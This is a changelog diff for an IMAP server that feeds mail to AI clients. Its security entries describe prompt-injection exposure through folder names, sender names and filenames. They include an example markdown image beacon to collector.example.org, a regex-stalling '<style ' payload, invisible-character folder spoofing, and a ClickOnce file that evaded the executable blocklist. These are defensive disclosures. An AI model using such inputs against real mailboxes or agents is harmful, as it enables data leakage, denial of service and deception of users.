@@ -12,6 +12,176 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
      last in the file so the link definitions come along. -->
 <!-- #region changelog -->
 
+## [Unreleased]
+
+### Added
+
+- Every tool declares an `outputSchema` and answers with `structuredContent`
+  beside the text block. A client no longer has to parse prose to use a result.
+
+  Every tool that reports anything out of the mailbox carries `untrusted: true`
+  and `source: "imap"` as fields, not only as a preamble in the text. A sender
+  display name, a folder name a colleague chose and an attachment filename are
+  all attacker-controllable and reach the model through the listing tools long
+  before anyone opens a message, so a client that reads the structured half must
+  not get them unframed. `get_server_info` and the five write tools do not carry
+  it: those report this server's own configuration, or what it just did with the
+  uids it was given.
+
+  `get_message` and a text attachment keep the nonce fence in the text block;
+  the structured half states the same fields rather than making a client parse
+  it. An image attachment keeps its bytes in the content block, where a client
+  renders them, instead of repeating the base64.
+
+### Changed
+
+- The advertised schemas avoid spellings that are legal JSON Schema and still
+  get a tool refused, or its constraint silently dropped, by some MCP clients:
+  an open object now writes `"additionalProperties": true` rather than the
+  empty schema `{}` zod emits for it; a value that was left untyped is declared
+  as what it really is; and a nullable field is written as `anyOf` branches
+  rather than `"type": ["string", "null"]`, which several clients read as a
+  single type and then drop. What the tools accept and return is unchanged;
+  only the way the schema says so is.
+
+- **Four refusals are error results rather than plain ones.** An attachment the
+  policy rejects, one whose bytes are an executable whatever it declared, one
+  too large to return inline, and the `manage_mailbox` rename prompt. Each read
+  like an answer while being the opposite, and a tool that declares an output
+  schema may not answer without `structuredContent` unless the result is an
+  error.
+
+- A result too large to shrink is an error rather than an envelope carrying the
+  oversized document as a string. That envelope is valid JSON and no longer a
+  valid _answer_: the SDK checks a result against the schema its tool declares.
+
+- The two-call `confirm_token` prompt is an error result, for the same reason.
+  The text is unchanged and still carries the token.
+
+### Changed
+
+- A `confirm_token` that does not match its arguments is **refused with the
+  reason** instead of being answered with a fresh prompt. The binding is
+  unchanged — a confirmation issued for one set of UIDs still cannot delete
+  another, and one for INBOX cannot delete from Archive — but the answer now
+  says which of the two happened. The rename branch of `manage_mailbox` is
+  unaffected: it uses the plain two-call token and still re-prompts.
+
+- **`move_messages` now asks a person**, for both `move` and `copy`. It was on
+  the token alone, on the grounds that a move destroys nothing, and its own
+  comment already said what is wrong with that: `destination` is a free-form
+  mailbox name, so on a shared account or a public namespace one call hands
+  every named message to everyone who can read that folder. Disclosure is the
+  part that cannot be taken back, and a token only proves the model agreed with
+  itself.
+
+  The binding is unchanged: the exact UID set and both mailboxes, with different
+  keys for `move` and `copy`.
+
+- `ELICITATION` switches the dialog off — `false` sends a client that could have
+  been asked down the two-call-token path instead. For a scheduled job or a test
+  harness, where a dialog is the wrong shape rather than an unwanted one.
+
+  It does **not** remove the guard: there is no setting in which a guarded call
+  goes unannounced. Two deliberate rough edges come with it. The variable is
+  **not prefixed**, so one `export ELICITATION=false` reaches every MCP server in
+  the environment — which is why a server started with it off prints a line
+  saying so, and why the fallback text names the server instead of blaming a
+  client that was working fine. And a value that is neither `true` nor `false`
+  **stops the server**, like `IMAP_TLS` and unlike `IMAP_READ_ONLY`: this is the
+  only variable here that defaults to _on_. It is read after `IMAP_PASSWORD` is
+  wiped from the environment, so that exit cannot leave the password behind.
+
+- A `docs/guide/approval.md` page.
+
+- `delete_messages` and `manage_mailbox` name themselves in the fallback text
+  rather than saying "call this tool again".
+
+- Runs on **MCP SDK 2.0**. Existing clients see the same protocol revision they
+  always did; the change is the package layout behind it.
+
+- The linter is **oxlint** instead of eslint plus typescript-eslint, which lifts
+  the TypeScript ceiling: typescript-eslint pins `typescript` below 6.1, so this
+  repository was held on TypeScript 6 by its linter rather than by its code.
+
+- The tool filter, the confirmation store, the approval flow and the
+  documentation-asset generator now come from **`mcp-tool-allowlist`**,
+  **`mcp-approval`** and **`svg-asset-set`** rather than from copies kept here
+  — 1000 fewer lines. The approval flow was written in this repository and cut
+  into a library once smtp-mcp had grown a near-identical copy of it; the
+  behaviour is the same, with one owner. None of the packages has a runtime
+  dependency of its own.
+
+- stdio is served through `serveStdio`, so the connection's era is negotiated
+  on the opening exchange rather than assumed. A client that pins the
+  `2026-07-28` era is served it; until now its `server/discover` probe was
+  answered with "Method not found" and only `2025-11-25` was on offer. A client
+  that speaks the older era sees no change — it is still pinned to one instance
+  for the life of the connection, exactly as a hand-wired
+  `StdioServerTransport` served it.
+
+### Fixed
+
+- An entry in `IMAP_ALLOW_TOOLS` that is not tool-name-shaped is now
+  **redacted** in the error rather than quoted back. `IMAP_PASSWORD` and
+  `IMAP_ALLOW_TOOLS` are adjacent lines in every compose file, and a paste into
+  the wrong one used to print the credential into the client's log.
+
+### Security
+
+- **A single mail could stop the server for half a minute.** `htmlToText` was a
+  chain of regexes with bounded scan windows, and a bounded window bounds one
+  factor of a product: the other is how many scans an input can start. A
+  `text/html` body of `'<style '` repeated 73 000 times is 512 000 legal bytes
+  that start 73 000 scans and finish none, and it measured **33 seconds** —
+  Node is single-threaded and the transport is stdio, so nothing else was
+  served meanwhile. The IMAP command timeout could not help; it wraps commands,
+  not parsing, and its `setTimeout` cannot fire on a blocked event loop. Two
+  more shapes did the same, and the tag stripper itself was scanning without
+  any bound at all: `'<a '` with no `>` in the document took 57 seconds.
+
+  The pass is now one forward walk with cursors that never rewind, plus one
+  global budget for closing-tag searches — a cap on the product rather than on
+  either factor. The same inputs are under 20 ms. Stripping is still best
+  effort and the fence is still what carries the weight.
+
+  The test that was supposed to catch this measured 238 ms, because its payload
+  was longer than the 512 000-character input cap and the hostile half was
+  sliced off before a regex saw it.
+
+- **Folder names went to the model unsanitised.** Every other mailbox string
+  goes through `sanitizeText` or `sanitizeFilename`; `list_mailboxes` returned
+  `path`, `name` and `specialUse` raw, so a right-to-left override survived, and
+  so did `![](https://collector.example.org/p?s=x)` — the beacon
+  `defuseAutoFetch` exists to take apart, arriving through the one door without
+  it. Each entry now carries a sanitised `display_name` beside the verbatim
+  `path`, and a `name_warning` spelling out the difference when there is one.
+  `path` stays verbatim on purpose: it is the argument the other tools take.
+
+  The confirmation dialog shows folder names with their invisible characters
+  removed and escaped beside them — `Archive` and `Archive<U+200B>` are the same
+  pixels, so the gate was asking about one folder and acting on another. The
+  audit log on stderr escapes them too, which is what its own comment always
+  said it did. `mailboxParam` now refuses the whole C0/C1 range rather than
+  `\r\n\0` alone.
+
+- **`get_message(include_thread: true)` returned up to 2.9× the stated result
+  budget.** It went out through a path that never touched `budgetedJson`, and
+  fifty thread summaries with capped 2 000-character subjects and
+  4 000-character address lists are 10 kB each — all sender-chosen. The metadata
+  block is now budgeted to a quarter of the result with the thread list as the
+  first thing dropped, and the assembled result is checked as a whole, which
+  also catches the growth from defusing images and from the per-line datamarks.
+
+- **Two entries of the executable blocklist could never match.** `extensionOf`
+  read extensions with `/\.([A-Za-z0-9]{1,10})$/`, so `appref-ms` (hyphen) and
+  `application` (eleven characters) both read as no extension — and no extension
+  makes the check skip rather than fail. With `IMAP_DOWNLOAD_DIR` set,
+  `Rechnung-2026.appref-ms` declared `application/xml` reached the disk under its
+  own name with nothing noted against it; a ClickOnce manifest is valid XML, so
+  the magic-byte check had nothing to object to either. A test now walks the
+  whole blocklist and requires every entry to be refused.
+
 ## [0.2.0] - 2026-08-30
 
 This is the first release published to npm, so everything below reaches a
